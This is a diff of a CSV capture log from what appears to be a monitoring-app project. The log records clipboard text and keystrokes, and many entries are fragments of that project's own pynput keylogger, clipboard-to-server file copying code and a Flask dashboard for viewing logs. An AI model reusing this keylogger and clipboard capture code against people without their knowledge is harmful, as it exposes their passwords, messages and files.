@@ -1,5 +1,5 @@
 Timestamp,Username,IP,Data
-2024-07-02 09:04:42,Toshiba,192.168.100.200,"<!DOCTYPE html>
+7/2/2024 9:04,Toshiba,192.168.100.200,"<!DOCTYPE html>
 <html lang=""en"">
   <head>
     <meta charset=""UTF-8"" />
@@ -76,8 +76,8 @@ Timestamp,Username,IP,Data
   </body>
 </html>
 "
-2024-07-02 09:05:03,Toshiba,192.168.100.200,Clipboard
-2024-07-02 09:05:46,Toshiba,192.168.100.200,"Toshiba
+7/2/2024 9:05,Toshiba,192.168.100.200,Clipboard
+7/2/2024 9:05,Toshiba,192.168.100.200,"Toshiba
 192.168.100.200
 
 Keystroke: Key.f5
@@ -145,7 +145,7 @@ Keystroke: k
 2024-07-02 09:05:21
 
 Keystroke: f"
-2024-07-02 09:08:45,Toshiba,192.168.100.200,"try:
+7/2/2024 9:08,Toshiba,192.168.100.200,"try:
         if hasattr(key, 'char') and key.char is not None:
             sentence_buffer.append(key.char)
         else:
@@ -165,7 +165,7 @@ Keystroke: f"
         if len(sentence_buffer) > 50:
             log_sentence(''.join(sentence_buffer))
             sentence_buffer = []"
-2024-07-02 09:11:58,Toshiba,192.168.100.200,"try:
+7/2/2024 9:11,Toshiba,192.168.100.200,"try:
         if hasattr(key, 'char') and key.char is not None:
             sentence_buffer.append(key.char)
         else:
@@ -185,10 +185,10 @@ Keystroke: f"
         if len(sentence_buffer) > 50:
             log_sentence(''.join(sentence_buffer))
             sentence_buffer = []"
-2024-07-02 09:12:20,Toshiba,192.168.100.200,pressed_keys
-2024-07-02 09:13:27,Toshiba,192.168.100.200,pressed_keys
-2024-07-02 09:15:25,Toshiba,192.168.100.200,pressed_keys
-2024-07-02 09:16:28,Toshiba,192.168.100.200,"Toshiba
+7/2/2024 9:12,Toshiba,192.168.100.200,pressed_keys
+7/2/2024 9:13,Toshiba,192.168.100.200,pressed_keys
+7/2/2024 9:15,Toshiba,192.168.100.200,pressed_keys
+7/2/2024 9:16,Toshiba,192.168.100.200,"Toshiba
 192.168.100.200
 
 Keystroke: in
@@ -204,7 +204,7 @@ Keystroke: not wor
 2024-07-02 09:16:14
 
 Keystroke:"
-2024-07-02 09:16:58,Toshiba,192.168.100.200,"import time
+7/2/2024 9:16,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -314,7 +314,7 @@ with keyboard.Listener(on_release=on_release) as listener:
     listener.join()
     print(""Listening..."")
 "
-2024-07-02 09:19:36,Toshiba,192.168.100.200,"import time
+7/2/2024 9:19,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -414,7 +414,7 @@ def on_release(key):
 with keyboard.Listener(on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:22:01,Toshiba,192.168.100.200,"import time
+7/2/2024 9:22,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -514,7 +514,7 @@ def on_release(key):
 with keyboard.Listener(on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:24:23,Toshiba,192.168.100.200,"import time
+7/2/2024 9:24,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -615,7 +615,7 @@ def on_release(key):
 with keyboard.Listener(on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:27:49,Toshiba,192.168.100.200,"import time
+7/2/2024 9:27,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -705,7 +705,7 @@ def on_release(key):
 with keyboard.Listener(on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:27:56,Toshiba,192.168.100.200,"import time
+7/2/2024 9:27,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -795,14 +795,14 @@ def on_release(key):
 with keyboard.Listener(on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:28:06,Toshiba,192.168.100.200,"Keystroke logged: this
+7/2/2024 9:28,Toshiba,192.168.100.200,"Keystroke logged: this
 Keystroke logged: is
 Keystroke logged: not
 Keystroke logged: g
 Keystroke logged: ood
 Keystroke logged: ata
 Keystroke logged: all"
-2024-07-02 09:28:18,Toshiba,192.168.100.200,"Toshiba
+7/2/2024 9:28,Toshiba,192.168.100.200,"Toshiba
 192.168.100.200
 
 Keystroke: v
@@ -830,7 +830,7 @@ Keystroke: g
 2024-07-02 09:27:58
 
 Keystroke: this"
-2024-07-02 09:34:21,Toshiba,192.168.100.200,"import time
+7/2/2024 9:34,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -922,7 +922,7 @@ def on_release(key):
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:34:44,Toshiba,192.168.100.200,"import time
+7/2/2024 9:34,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -1014,7 +1014,7 @@ def on_release(key):
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:35:27,Toshiba,192.168.100.200,"import time
+7/2/2024 9:35,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -1106,7 +1106,7 @@ def on_release(key):
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:38:20,Toshiba,192.168.100.200,"Keystroke logged: tring
+7/2/2024 9:38,Toshiba,192.168.100.200,"Keystroke logged: tring
 Keystroke logged: and
 Keystroke logged: ca
 Keystroke logged: does
@@ -1128,7 +1128,7 @@ Keystroke logged: p
 Keystroke logged: iece
 Keystroke logged: like
 Keystroke logged: this"
-2024-07-02 09:39:53,Toshiba,192.168.100.200,"buffer = []
+7/2/2024 9:39,Toshiba,192.168.100.200,"buffer = []
 
 def log_sentence_buffer():
     global buffer
@@ -1157,14 +1157,14 @@ def on_press(key):
     except Exception as e:
         print(f""Error logging keystroke: {e}"")
 "
-2024-07-02 09:40:06,Toshiba,192.168.100.200,"def log_sentence_buffer():
+7/2/2024 9:40,Toshiba,192.168.100.200,"def log_sentence_buffer():
     global buffer
     if buffer:
         sentence = ''.join(buffer)
         log_sentence(sentence)
         buffer = []
 "
-2024-07-02 09:40:30,Toshiba,192.168.100.200,"def on_press(key):
+7/2/2024 9:40,Toshiba,192.168.100.200,"def on_press(key):
     global buffer
     try:
         if key in modifier_keys:
@@ -1183,7 +1183,7 @@ def on_press(key):
 
     except Exception as e:
         print(f""Error logging keystroke: {e}"")"
-2024-07-02 09:40:51,Toshiba,192.168.100.200,"def on_press(key):
+7/2/2024 9:40,Toshiba,192.168.100.200,"def on_press(key):
     global buffer
     try:
         if key in modifier_keys:
@@ -1202,17 +1202,17 @@ def on_press(key):
 
     except Exception as e:
         print(f""Error logging keystroke: {e}"")"
-2024-07-02 09:42:54,Toshiba,192.168.100.200,"sentence = re.sub(r'\s+', ' ', sentence.replace('\n', ' '))"
-2024-07-02 09:50:08,Toshiba,192.168.100.200,"<div class=""row row-data"">
+7/2/2024 9:42,Toshiba,192.168.100.200,"sentence = re.sub(r'\s+', ' ', sentence.replace('\n', ' '))"
+7/2/2024 9:50,Toshiba,192.168.100.200,"<div class=""row row-data"">
       {% for log in clipboard_logs %}
       <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
         <p>{{ log.text }}</p>
         <p class=""timestamp text-right"">{{ log.timestamp }}</p>
       </div>"
-2024-07-02 09:50:43,Toshiba,192.168.100.200,"else:
+7/2/2024 9:50,Toshiba,192.168.100.200,"else:
             if key not in modifier_keys:  # Only add non-modifier keys to buffer
                 buffer.append(str(key))"
-2024-07-02 09:51:04,Toshiba,192.168.100.200,"import time
+7/2/2024 9:51,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -1322,32 +1322,32 @@ def on_release(key):
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:51:22,Toshiba,192.168.100.200,"else:
+7/2/2024 9:51,Toshiba,192.168.100.200,"else:
             if key not in modifier_keys:  # Only add non-modifier keys to buffer
                 buffer.append(str(key))
                 log_buffer()
                 return"
-2024-07-02 09:52:02,Toshiba,192.168.100.200,"else:
+7/2/2024 9:52,Toshiba,192.168.100.200,"else:
             if key not in modifier_keys:  # Only add non-modifier keys to buffer
                 buffer.append(str(key))
                 log_buffer()
                 return"
-2024-07-02 09:53:21,Toshiba,192.168.100.200,"else:
+7/2/2024 9:53,Toshiba,192.168.100.200,"else:
             if key not in modifier_keys:  # Only add non-modifier keys to buffer
                 buffer.append(str(key))
                 log_buffer()
                 return"
-2024-07-02 09:53:34,Toshiba,192.168.100.200,"else:
+7/2/2024 9:53,Toshiba,192.168.100.200,"else:
             if key not in modifier_keys:  # Only add non-modifier keys to buffer
                 buffer.append(str(key))
                 log_buffer()
                 return"
-2024-07-02 09:54:19,Toshiba,192.168.100.200,"else:
+7/2/2024 9:54,Toshiba,192.168.100.200,"else:
             if key not in modifier_keys:  # Only add non-modifier keys to buffer
                 buffer.append(str(key))
                 log_buffer()
                 return"
-2024-07-02 09:56:10,Toshiba,192.168.100.200,"try:
+7/2/2024 9:56,Toshiba,192.168.100.200,"try:
         if key in modifier_keys:
             return  # Skip logging modifier keys
 
@@ -1367,7 +1367,7 @@ with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
             # Handle non-character keys
             buffer.append(str(key))
             log_buffer()  # Log buffer after adding non-character key"
-2024-07-02 09:56:22,Toshiba,192.168.100.200,"Keystroke logged: s
+7/2/2024 9:56,Toshiba,192.168.100.200,"Keystroke logged: s
 Keystroke logged: t
 Keystroke logged: t
 Keystroke logged: e
@@ -1392,7 +1392,7 @@ Keystroke logged: a
 Keystroke logged: i
 Keystroke logged: n
 Keystroke logged:"
-2024-07-02 09:57:42,Toshiba,192.168.100.200,"Keystroke logged: s
+7/2/2024 9:57,Toshiba,192.168.100.200,"Keystroke logged: s
 Keystroke logged: t
 Keystroke logged: t
 Keystroke logged: e
@@ -1417,7 +1417,7 @@ Keystroke logged: a
 Keystroke logged: i
 Keystroke logged: n
 Keystroke logged:"
-2024-07-02 09:57:53,Toshiba,192.168.100.200,"import time
+7/2/2024 9:57,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -1526,7 +1526,7 @@ def on_release(key):
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:58:58,Toshiba,192.168.100.200,"import time
+7/2/2024 9:58,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -1635,7 +1635,7 @@ def on_release(key):
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 09:59:56,Toshiba,192.168.100.200,"import time
+7/2/2024 9:59,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -1744,7 +1744,7 @@ def on_release(key):
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 10:00:32,Toshiba,192.168.100.200,"import time
+7/2/2024 10:00,Toshiba,192.168.100.200,"import time
 from datetime import datetime
 from pynput import keyboard
 import sqlite3
@@ -1853,7 +1853,7 @@ def on_release(key):
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 "
-2024-07-02 10:02:44,Toshiba,192.168.100.200,"@app.route(""/"")
+7/2/2024 10:02,Toshiba,192.168.100.200,"@app.route(""/"")
 def dashboard():
     unique_users = get_unique_users()
     user_logs = get_user_logs()
@@ -1864,7 +1864,7 @@ def dashboard():
         user_logs=user_logs,
         clipboard_logs=clipboard_logs,
     )"
-2024-07-02 10:03:23,Toshiba,192.168.100.200,"<!-- index.html -->
+7/2/2024 10:03,Toshiba,192.168.100.200,"<!-- index.html -->
 <!DOCTYPE html>
 <html lang=""en"">
 <head>
@@ -1889,20 +1889,20 @@ def dashboard():
 </body>
 </html>
 "
-2024-07-02 10:07:52,Toshiba,192.168.100.200,"<p>{{ log.text }}</p>
+7/2/2024 10:07,Toshiba,192.168.100.200,"<p>{{ log.text }}</p>
                 <p class=""timestamp text-right"">{{ log.timestamp }}</p>"
-2024-07-02 10:08:21,Toshiba,192.168.100.200,clipclipboard
-2024-07-02 10:09:35,Toshiba,192.168.100.200,"SELECT timestamp, username, ip, text FROM clipboard_logs ORDER BY timestamp DESC"
-2024-07-02 10:11:03,Toshiba,192.168.100.200,SELECT * FROM clipboard_logs
-2024-07-02 10:12:15,Toshiba,192.168.100.200,".schema logs
+7/2/2024 10:08,Toshiba,192.168.100.200,clipclipboard
+7/2/2024 10:09,Toshiba,192.168.100.200,"SELECT timestamp, username, ip, text FROM clipboard_logs ORDER BY timestamp DESC"
+7/2/2024 10:11,Toshiba,192.168.100.200,SELECT * FROM clipboard_logs
+7/2/2024 10:12,Toshiba,192.168.100.200,".schema logs
 "
-2024-07-02 10:16:27,Toshiba,192.168.100.200,SELECT * FROM clipboard_logs
-2024-07-02 10:19:37,Toshiba,192.168.100.200,".database
+7/2/2024 10:16,Toshiba,192.168.100.200,SELECT * FROM clipboard_logs
+7/2/2024 10:19,Toshiba,192.168.100.200,".database
 main: C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\keylog.db; r/w
 sqlite> .tables
 sqlite> .table 
 sqlite> "
-2024-07-02 10:21:54,Toshiba,192.168.100.200,"import sqlite3
+7/2/2024 10:21,Toshiba,192.168.100.200,"import sqlite3
 
 DB_FILE = ""path_to_your_database_file.db""  # Replace with your actual database file path
 
@@ -1936,10 +1936,10 @@ if __name__ == ""__main__"":
         else:
             print(f""Table '{table}' does not exist in the database."")
 "
-2024-07-02 10:22:54,Toshiba,192.168.100.200,"python checkingDB.py
+7/2/2024 10:22,Toshiba,192.168.100.200,"python checkingDB.py
 Table 'logs' exists in the database.
 Table 'clipboard_logs' exists in the database."
-2024-07-02 10:26:00,Toshiba,192.168.100.200,"<!-- index.html -->
+7/2/2024 10:26,Toshiba,192.168.100.200,"<!-- index.html -->
 <!DOCTYPE html>
 <html lang=""en"">
   <head>
@@ -1971,7 +1971,7 @@ Table 'clipboard_logs' exists in the database."
   </body>
 </html>
 "
-2024-07-02 10:26:11,Toshiba,192.168.100.200,"@app.route(""/clip"")
+7/2/2024 10:26,Toshiba,192.168.100.200,"@app.route(""/clip"")
 def clipboard():
     unique_users = get_unique_users()
     user_logs = get_user_logs()
@@ -1982,7 +1982,7 @@ def clipboard():
         user_logs=user_logs,
         clipboard_logs=clipboard_logs,
     )"
-2024-07-02 10:28:25,Toshiba,192.168.100.200,"def get_clipboard_logs():
+7/2/2024 10:28,Toshiba,192.168.100.200,"def get_clipboard_logs():
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute(
@@ -1999,7 +1999,7 @@ def clipboard():
             clipboard_logs[user_key] = []
         clipboard_logs[user_key].append({""timestamp"": timestamp, ""text"": text})
     return clipboard_logs"
-2024-07-02 10:29:36,Toshiba,192.168.100.200,"def get_clipboard_logs():
+7/2/2024 10:29,Toshiba,192.168.100.200,"def get_clipboard_logs():
     try:
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
@@ -2010,3 +2010,272 @@ def clipboard():
     except sqlite3.Error as e:
         print(f""Error retrieving clipboard logs: {e}"")
         return []"
+7/2/2024 10:30,Toshiba,192.168.100.200,jinja2.exceptions.UndefinedError: 'list object' has no attribute 'items'
+7/2/2024 10:33,Toshiba,192.168.100.200,"{% for log in clipboard_logs %}
+        <p>{{ log.text }}</p>
+        <p class=""timestamp text-right"">{{ log.timestamp }}</p>
+        {% endfor %}"
+7/2/2024 10:36,Toshiba,192.168.100.200,"File ""C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\templates\index.html"", line 47, in top-level template code
+{% endfor %} {% endif %} {% if clipboard_logs %} {% for user, logs in
+File ""c:\ProgramData\anaconda3\Lib\site-packages\jinja2\utils.py"", line 83, in from_obj
+if hasattr(obj, ""jinja_pass_arg""):
+   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+jinja2.exceptions.UndefinedError: 'list object' has no attribute 'items'"
+7/2/2024 10:38,Toshiba,192.168.100.200,"<!-- index.html -->
+<!DOCTYPE html>
+<html lang=""en"">
+  <head>
+    <meta charset=""UTF-8"" />
+    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
+    <title>Clipboard Logs</title>
+    <link
+      rel=""stylesheet""
+      href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css""
+    />
+    <link
+      rel=""stylesheet""
+      href=""{{ url_for('static', filename='styles.css') }}""
+    />
+  </head>
+  <body>
+    <div class=""container"">
+      <h1>Clipboard Logs</h1>
+      <ul>
+        {% for log in clipboard_logs %}
+        <p>{{ log.text }}</p>
+        <p class=""timestamp text-right"">{{ log.timestamp }}</p>
+        {% endfor %}
+      </ul>
+    </div>
+    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
+    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
+    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
+  </body>
+</html>
+"
+7/2/2024 10:44,Toshiba,192.168.100.200,"conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute(""SELECT timestamp, username, ip, text FROM logs ORDER BY timestamp DESC"")
+    rows = c.fetchall()
+    conn.close()
+
+    user_logs = {}
+    for row in rows:
+        timestamp, username, ip, text = row
+        user_key = (username, ip)
+        if user_key not in user_logs:
+            user_logs[user_key] = []
+        user_logs[user_key].append({""timestamp"": timestamp, ""text"": text})
+    return user_logs"
+7/2/2024 10:44,Toshiba,192.168.100.200,clipboard_logs
+7/2/2024 10:45,Toshiba,192.168.100.200,clipboard.html is working fine and
+7/2/2024 10:47,Toshiba,192.168.100.200,"{% else %}
+          <div class=""alert alert-info text-center"" role=""alert"">
+            No logs found yet. Monitor activity for data to appear."
+7/2/2024 10:49,Toshiba,192.168.100.200,"{% else %}
+          <div class=""alert alert-info text-center"" role=""alert"">
+            No logs found yet. Monitor activity for data to appear."
+7/2/2024 10:49,Toshiba,192.168.100.200,thisis so good
+7/2/2024 10:50,Toshiba,192.168.100.200,"<div class=""row row-data"">
+              {% for log in logs %}
+              <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
+                <p>{{ log.text }}</p>
+                <p class=""timestamp text-left"">{{ log.timestamp }}</p>
+              </div>
+              {% endfor %}
+            </div>
+          </section>
+          {% endfor %} {% endif %} {% if clipboard_logs %}
+            <div class=""row row-data"">
+              {% for log in clipboard_logs %}
+              <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
+                <p>{{ log.text }}</p>
+                <p class=""timestamp text-left"">{{ log.timestamp }}</p>
+              </div>
+              {% endfor %}
+            </div>
+          </section>
+          {% else %}
+          <div class=""alert alert-info text-center"" role=""alert"">
+            No logs found yet. Monitor activity for data to appear.
+          </div>
+          {% endif %}"
+7/2/2024 10:52,Toshiba,192.168.100.200,"{% if clipboard_logs %}
+        <section>
+            <h2>Clipboard Logs</h2>
+            <div class=""row row-data"">
+                {% for log in clipboard_logs %}
+                <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
+                    <p>{{ log.text }}</p>
+                    <p class=""timestamp text-left"">{{ log.timestamp }}</p>
+                </div>
+                {% endfor %}
+            </div>
+        </section>
+        {% endif %}
+
+        <!-- Alert if no logs found -->
+        {% if not logs and not clipboard_logs %}
+        <div class=""alert alert-info text-center"" role=""alert"">
+            No logs found yet. Monitor activity for data to appear.
+        </div>
+        {% endif %}
+    </div>"
+7/2/2024 10:53,Toshiba,192.168.100.200,he uisthe issue seems to be appear here
+7/2/2024 10:55,Toshiba,192.168.100.200,he uisthe issue seems to be appear here
+7/2/2024 10:58,Toshiba,192.168.100.200,"<div class=""container"">
+        <h1>Logs and Clipboard</h1>
+
+        <!-- Display logs -->
+        {% if logs %}
+        <section>
+            <h2>Keystroke Logs</h2>
+            <div class=""row row-data"">
+                {% for log in logs %}
+                <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
+                    <p>{{ log.text }}</p>
+                    <p class=""timestamp text-left"">{{ log.timestamp }}</p>
+                </div>
+                {% endfor %}
+            </div>
+        </section>
+        {% endif %}
+
+        <!-- Display clipboard logs -->
+        {% if clipboard_logs %}
+        <section>
+            <h2>Clipboard Logs</h2>
+            <div class=""row row-data"">
+                {% for log in clipboard_logs %}
+                <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
+                    <p>{{ log.text }}</p>
+                    <p class=""timestamp text-left"">{{ log.timestamp }}</p>
+                </div>
+                {% endfor %}
+            </div>
+        </section>
+        {% endif %}
+
+        <!-- Alert if no logs found -->
+        {% if not logs and not clipboard_logs %}
+        <div class=""alert alert-info text-center"" role=""alert"">
+            No logs found yet. Monitor activity for data to appear.
+        </div>
+        {% endif %}
+    </div>
+
+    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
+    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
+    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>"
+7/2/2024 11:01,Toshiba,192.168.100.200,clipboard both
+7/2/2024 11:01,Toshiba,192.168.100.200,clipboard both
+7/2/2024 11:04,Toshiba,192.168.100.200,clipboard both
+7/2/2024 11:05,Toshiba,192.168.100.200,clipboard_logs
+7/2/2024 11:09,Toshiba,192.168.100.200,prin(table
+7/2/2024 11:12,Toshiba,192.168.100.200,"try:
+                        dest_path = os.path.join(files_dir, os.path.basename(file_path))
+                        shutil.copy(file_path, dest_path)  # Copy the file to server
+                        log_entry = f""Clipboard: copy path: {file_path}, paste path: {dest_path}""
+
+                        conn = sqlite3.connect(DB_FILE)
+                        c = conn.cursor()
+                        c.execute(
+                            ""INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)"",
+                            (timestamp, username, ip, log_entry),
+                        )
+                        conn.commit()
+                        conn.close()
+
+                        print(f""Clipboard logged: {log_entry}"")"
+7/2/2024 11:12,Toshiba,192.168.100.200,"try:
+                        dest_path = os.path.join(files_dir, os.path.basename(file_path))
+                        shutil.copy(file_path, dest_path)  # Copy the file to server
+                        log_entry = f""Clipboard: copy path: {file_path}, paste path: {dest_path}""
+
+                        conn = sqlite3.connect(DB_FILE)
+                        c = conn.cursor()
+                        c.execute(
+                            ""INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)"",
+                            (timestamp, username, ip, log_entry),
+                        )
+                        conn.commit()
+                        conn.close()
+
+                        print(f""Clipboard logged: {log_entry}"")"
+7/2/2024 11:13,Toshiba,192.168.100.200,splite3 is keep asking for prompt
+7/2/2024 11:15,Toshiba,192.168.100.200,C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\keylog.db
+7/2/2024 11:28,Toshiba,192.168.100.200,.shell pwd
+7/2/2024 11:29,Toshiba,192.168.100.200,"Error logging clipboard text: no such table: clipboard_logs
+Error logging keystroke: no such table: logs"
+7/2/2024 11:30,Toshiba,192.168.100.200,"oke: no such table: logs
+Error logging keystroke: no such"
+7/2/2024 11:30,Toshiba,192.168.100.200,"oke: no such table: logs
+Error logging keystroke: no such"
+7/2/2024 11:30,Toshiba,192.168.100.200,"So this is working now
+"
+7/2/2024 11:36,Toshiba,192.168.100.200,"<!-- clipboard.html -->
+<!DOCTYPE html>
+<html lang=""en"">
+<head>
+    <meta charset=""UTF-8"">
+    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
+    <title>Clipboard Logs</title>
+    <link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"">
+    <link rel=""stylesheet"" href=""{{ url_for('static', filename='styles.css') }}"">
+</head>
+<body>
+    <div class=""container"">
+        <h1>Clipboard Logs</h1>
+
+        <!-- Display clipboard logs -->
+        {% if clipboard_logs %}
+        <section>
+            <h2>Clipboard Logs</h2>
+            <div class=""row row-data"">
+                {% for log in clipboard_logs %}
+                <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
+                    <p>{{ log.text }}</p>
+                    <p class=""timestamp text-left"">{{ log.timestamp }}</p>
+                </div>
+                {% endfor %}
+            </div>
+        </section>
+        {% else %}
+        <div class=""alert alert-info text-center"" role=""alert"">
+            No clipboard logs found yet. Monitor activity for data to appear.
+        </div>
+        {% endif %}
+    </div>
+
+    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
+    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
+    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
+</body>
+</html>"
+7/2/2024 11:37,Toshiba,192.168.100.200,"Clipboard Logs
+"
+7/2/2024 11:39,Toshiba,192.168.100.200,"if isinstance(data, list):  # Check if data is a list of file paths
+            for file_path in data:
+                if os.path.isfile(file_path):
+                    try:
+                        dest_path = os.path.join(files_dir, os.path.basename(file_path))
+                        shutil.copy(file_path, dest_path)  # Copy the file to server
+                        log_entry = f""Clipboard: copy path: {file_path}, paste path: {dest_path}""
+
+                        conn = sqlite3.connect(DB_FILE)
+                        c = conn.cursor()
+                        c.execute(
+                            ""INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)"",
+                            (timestamp, username, ip, log_entry),
+                        )
+                        conn.commit()
+                        conn.close()
+
+                        print(f""Clipboard logged: {log_entry}"")
+                    except Exception as e:
+                        print(f""Error logging clipboard file: {e}"")
+                else:
+                    print(f""File not found: {file_path}"")
+
+        else:
+            log_entry = f""Clipboard: {data}"""
